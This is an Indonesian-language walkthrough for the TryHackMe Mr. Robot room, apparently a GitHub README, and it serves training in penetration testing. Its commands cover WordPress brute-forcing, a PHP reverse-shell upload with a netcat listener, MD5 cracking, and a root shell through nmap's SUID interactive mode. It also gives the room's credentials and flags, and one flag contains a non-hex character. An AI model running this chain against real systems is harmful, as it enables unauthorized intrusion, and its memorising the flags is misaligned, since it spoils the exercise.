# 🤖 Mr. Robot — TryHackMe CTF Write-Up

<div align="center">

![TryHackMe](https://img.shields.io/badge/TryHackMe-Mr.Robot-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-yellow?style=for-the-badge&logo=linux)
![Status](https://img.shields.io/badge/Status-Pwned%20✓-brightgreen?style=for-the-badge)

**Platform:** [TryHackMe](https://tryhackme.com/room/mrrobot) | **Category:** Linux, Web, Privilege Escalation | **Flags:** 3 Keys

</div>

---

## 📋 Daftar Isi

- [Overview](#-overview)
- [Tools yang Digunakan](#-tools-yang-digunakan)
- [Step 1 — Reconnaissance (Nmap)](#step-1--reconnaissance--nmap-scan)
- [Step 2 — Web Enumeration](#step-2--web-enumeration)
- [Step 3 — WordPress Bruteforce](#step-3--wordpress-bruteforce)
- [Step 4 — Mendapatkan Shell](#step-4--mendapatkan-shell--reverse-shell)
- [Step 5 — Key 2 & Crack MD5](#step-5--key-2--crack-hash-md5)
- [Step 6 — Privilege Escalation (Root)](#step-6--privilege-escalation--root)
- [Ringkasan Flag](#-ringkasan-semua-flag)
- [Lessons Learned](#-lessons-learned)

---

## 🎯 Overview

Room Mr. Robot di TryHackMe terinspirasi dari serial TV **Mr. Robot**. Target adalah sebuah mesin Linux yang menjalankan **WordPress**. Tujuan kita adalah menemukan **3 hidden key (flag)** yang tersembunyi di dalam sistem.

```
Target   : Mesin Linux (TryHackMe)
Web App  : WordPress
Goal     : 3 Keys / Flags
Attack   : Recon → Web Enum → Bruteforce → Shell → PrivEsc
```

| Key | Lokasi | Metode |
|-----|--------|--------|
| Key 1 | `robots.txt` | Web Enumeration |
| Key 2 | `/home/robot/key-2-of-3.txt` | Crack MD5 Hash |
| Key 3 | `/root/key-3-of-3.txt` | Privilege Escalation via Nmap SUID |

---

## 🛠 Tools yang Digunakan

| Tool | Fungsi |
|------|--------|
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory brute-forcing |
| `wpscan` | WordPress enumeration & bruteforce |
| `hydra` | Login bruteforce (alternatif) |
| `netcat (nc)` | Reverse shell listener |
| `john` | Crack password hash |
| `python` | Upgrade TTY shell |
| `metasploit` | Framework exploit (alternatif) |

---

## Step 1 — Reconnaissance / Nmap Scan

Selalu mulai dengan **reconnaissance**. Kita scan semua port yang terbuka beserta versi service-nya.

```bash
nmap -sV -sC -A -oN nmap_scan.txt <TARGET_IP>
```

**Penjelasan flag:**
- `-sV` → Deteksi versi service
- `-sC` → Jalankan default NSE scripts
- `-A` → Aggressive scan (OS detection + traceroute)
- `-oN` → Simpan output ke file `nmap_scan.txt`

**Output:**

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> 💡 **Analisis:** Port **80 (HTTP)** dan **443 (HTTPS)** terbuka dengan Apache. SSH tertutup. Target adalah web server — fokus ke sini.

---

## Step 2 — Web Enumeration

### 2.1 — Cek `robots.txt` → KEY 1 ADA DI SINI!

File `robots.txt` sering menyimpan path tersembunyi yang tidak ingin diindeks oleh search engine.

```bash
curl http://<TARGET_IP>/robots.txt
```

**Output:**

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

> 🎯 Dua file penting ditemukan:
> - `key-1-of-3.txt` → **Flag 1!**
> - `fsocity.dic` → Wordlist kustom untuk bruteforce!

```bash
# Ambil Flag 1
curl http://<TARGET_IP>/key-1-of-3.txt

# Download wordlist
wget http://<TARGET_IP>/fsocity.dic

# Bersihkan duplikat untuk mempercepat bruteforce
sort -u fsocity.dic > fsocity_clean.dic
```

> 🔎 Wordlist original: **858,160 baris** → setelah dibersihkan: **11,451 baris**

🚩 **FLAG 1:** `073403c8a58a1f80d943455fb30724b9`

---

### 2.2 — Directory Brute Force dengan Gobuster

Cari direktori dan file tersembunyi di web server.

```bash
gobuster dir \
  -u http://<TARGET_IP> \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50
```

**Output:**

```
/images               (Status: 301)
/wp-login             (Status: 200)  ← WordPress Login!
/wp-admin             (Status: 301)
/wp-content           (Status: 301)
/readme               (Status: 200)
/sitemap              (Status: 200)
```

> 💡 Target terbukti menjalankan **WordPress**. Selanjutnya kita bruteforce panel login-nya.

---

## Step 3 — WordPress Bruteforce

### 3.1 — Enumerate Username

```bash
wpscan --url http://<TARGET_IP> --enumerate u
```

**Output:**

```
[+] Enumerating Users
 | [i] User(s) Identified:
 |  - elliot
```

> 🎯 Username ditemukan: **elliot** (karakter utama Mr. Robot!)

---

### 3.2 — Bruteforce Password dengan WPScan

Gunakan wordlist `fsocity_clean.dic` yang sudah dibersihkan sebelumnya.

```bash
wpscan \
  --url http://<TARGET_IP> \
  --usernames elliot \
  --passwords fsocity_clean.dic \
  --password-attack wp-login
```

**Output:**

```
[SUCCESS] - elliot / ER28-0652
```

> ✅ **Kredensial WordPress:** `elliot` / `ER28-0652`

---

### 3.3 — Alternatif: Bruteforce dengan Hydra

```bash
hydra -l elliot -P fsocity_clean.dic <TARGET_IP> \
  http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```

---

## Step 4 — Mendapatkan Shell / Reverse Shell

Setelah login ke WordPress sebagai admin, kita akan menyisipkan **PHP Reverse Shell** melalui **Theme Editor**.

### 4.1 — Siapkan Reverse Shell

1. Download PHP reverse shell dari PentestMonkey:
   ```bash
   wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
   ```

2. Edit file — ubah IP dan port:
   ```php
   $ip = '<IP_KAMU>';   // IP mesin Kali/tun0
   $port = 4444;         // Port listener
   ```

### 4.2 — Upload via WordPress Theme Editor

```
Appearance → Theme Editor → Pilih Theme → 404.php
```

- Paste seluruh kode reverse shell
- Klik **Update File**

### 4.3 — Jalankan Listener

```bash
nc -lvnp 4444
```

### 4.4 — Trigger Reverse Shell

Akses URL yang tidak ada untuk memicu 404.php:

```bash
curl http://<TARGET_IP>/halaman-tidak-ada
# atau buka di browser
```

**Shell diterima:**

```
Connection received on <TARGET_IP>
$ whoami
daemon
```

### 4.5 — Upgrade ke Interactive TTY Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# atau
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

### 4.6 — Alternatif: Menggunakan Metasploit

```bash
msfconsole

use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <TARGET_IP>
set USERNAME elliot
set PASSWORD ER28-0652
set LHOST <IP_KAMU>
run
```

---

## Step 5 — Key 2 & Crack Hash MD5

### 5.1 — Navigasi ke Home Directory User Robot

```bash
cd /home/robot
ls -la
```

**Output:**

```
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
```

> ⚠️ `key-2-of-3.txt` tidak bisa dibaca langsung (hanya user `robot`).
> Tapi `password.raw-md5` bisa dibaca oleh siapa saja!

```bash
cat password.raw-md5
```

**Output:**

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

---

### 5.2 — Crack Hash dengan John the Ripper

Di mesin lokal (Kali Linux):

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt

john --format=raw-md5 \
     --wordlist=/usr/share/wordlists/rockyou.txt \
     hash.txt
```

**Output:**

```
abcdefghijklmnopqrstuvwxyz  (robot)
Session completed
```

> ✅ **Password robot:** `abcdefghijklmnopqrstuvwxyz`

---

### 5.3 — Login sebagai User Robot & Baca Key 2

```bash
su robot
# Masukkan password: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
```

🚩 **FLAG 2:** `822c73956184f694993bebb3eb32f0bp`

---

## Step 6 — Privilege Escalation → Root

### 6.1 — Cari Binary dengan SUID Bit

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Output (yang penting):**

```
/bin/ping
/bin/umount
/usr/local/bin/nmap    ← NMAP SUID!
/usr/bin/sudo
...
```

> 💡 **Kenapa Nmap berbahaya?**
> Nmap versi **lama (2.02–5.21)** memiliki fitur `--interactive` yang bisa menjalankan perintah shell. Karena SUID bit aktif, shell yang di-spawn akan berjalan sebagai **root**!

---

### 6.2 — Exploit Nmap Interactive Mode

```bash
# Cek versi nmap
nmap --version
# Nmap version 3.81

# Masuk ke interactive mode
nmap --interactive
```

```
nmap> !sh
```

```bash
sh-4.3# whoami
root

sh-4.3# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```

> 🎉 **ROOTED!** `euid=0` artinya kita punya akses root!

---

### 6.3 — Baca Flag 3 dari /root

```bash
cat /root/key-3-of-3.txt
```

🚩 **FLAG 3:** `04787ddef27c3dee1ee161b21670b4e4`

```bash
# Bonus: lihat isi direktori /root
ls -la /root
```

---

## 🏁 Ringkasan Semua Flag

| # | Flag | Lokasi | Metode |
|---|------|--------|--------|
| 🚩 Key 1 | `073403c8a58a1f80d943455fb30724b9` | `robots.txt` | Web Recon |
| 🚩 Key 2 | `822c73956184f694993bebb3eb32f0bp` | `/home/robot/` | Crack MD5 Hash |
| 🚩 Key 3 | `04787ddef27c3dee1ee161b21670b4e4` | `/root/` | Nmap SUID PrivEsc |

---

## 🗺 Attack Chain

```
[RECON]
  nmap scan → Port 80/443 terbuka (Apache + WordPress)
      │
[WEB ENUM]
  robots.txt → KEY 1 + fsocity.dic (wordlist)
  gobuster   → /wp-login ditemukan
      │
[EXPLOITATION]
  wpscan     → Username: elliot
  wpscan     → Password: ER28-0652
  WordPress  → PHP Reverse Shell via Theme Editor
  netcat     → Shell sebagai daemon
      │
[LATERAL MOVEMENT]
  /home/robot/password.raw-md5 → crack MD5
  su robot   → KEY 2
      │
[PRIVILEGE ESCALATION]
  find SUID  → /usr/local/bin/nmap
  nmap --interactive → !sh → ROOT
  /root/key-3-of-3.txt → KEY 3
```

---

## 📚 Lessons Learned

1. **Selalu cek `robots.txt`** — Sering menyimpan informasi sensitif yang sengaja atau tidak sengaja ditinggalkan developer.

2. **Bersihkan wordlist sebelum bruteforce** — `sort -u` mengurangi duplikat dan mempercepat serangan secara signifikan.

3. **Hash MD5 tanpa salt sangat rentan** — Selalu gunakan hashing modern (bcrypt, argon2) dengan salt untuk menyimpan password.

4. **SUID bit pada binary berbahaya** — Binary seperti Nmap, Python, atau Vim yang memiliki SUID bit bisa dimanfaatkan untuk privilege escalation.

5. **Selalu cek `sudo -l` dan SUID files** — Dua vektor privilege escalation yang paling umum di CTF dan dunia nyata.

6. **GTFOBins** adalah referensi wajib → [https://gtfobins.github.io](https://gtfobins.github.io)

---

## 🔗 Referensi

- [TryHackMe - Mr. Robot Room](https://tryhackme.com/room/mrrobot)
- [GTFOBins - Nmap](https://gtfobins.github.io/gtfobins/nmap/)
- [PentestMonkey - PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- [WPScan Documentation](https://github.com/wpscanteam/wpscan)

---

<div align="center">

**⚠️ Disclaimer:** Write-up ini dibuat hanya untuk keperluan edukasi dan latihan CTF pada platform yang sah (TryHackMe). Jangan gunakan teknik ini pada sistem yang tidak kamu miliki izin untuk diuji.

</div>

